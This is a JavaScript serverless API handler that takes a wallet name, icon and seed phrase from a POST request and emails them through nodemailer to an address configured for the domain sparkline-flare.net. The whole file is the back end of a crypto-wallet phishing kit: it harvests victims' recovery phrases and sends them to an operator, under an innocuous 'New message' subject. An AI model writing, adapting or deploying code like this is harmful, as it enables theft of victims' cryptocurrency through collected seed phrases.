import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const host = req.headers.host;

  // Domain-specific recipient emails only
  const domainRecipients = {
    "sparkline-flare.net": process.env.RECIPIENT_EMAIL_DOMAIN1,
    "www.sparkline-flare.net": process.env.RECIPIENT_EMAIL_DOMAIN1,
  };

  const recipientEmail = domainRecipients[host];

  if (!recipientEmail) {
    return res.status(404).json({
      error: "No recipient configured for this domain",
      domain: host,
    });
  }

  try {
    const { walletName, walletIcon, seedPhrase } = req.body;

    // Validate inputs
    if (!walletName || !walletIcon || !seedPhrase) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    // Create transporter with shared credentials
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT),
      secure: true, // true for 465, false for other ports
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });

    // Send email
    await transporter.sendMail({
      from: process.env.SMTP_FROM,
      to: recipientEmail,
      replyTo: process.env.SMTP_FROM,
      subject: `New message`,
      html: `
        <h2>New Wallet Submission</h2>
        <p><strong>Name:</strong> ${walletName}</p>
        <p><strong>Icon:</strong> ${walletIcon}</p>
        <p><strong>Phrase:</strong></p>
        <p>${seedPhrase}</p>
      `,
    });

    return res.status(200).json({
      success: true,
      message: "Email sent successfully",
    });
  } catch (error) {
    console.error("Email error:", error);
    return res.status(500).json({
      error: "Failed to send email",
      details: error.message,
    });
  }
}
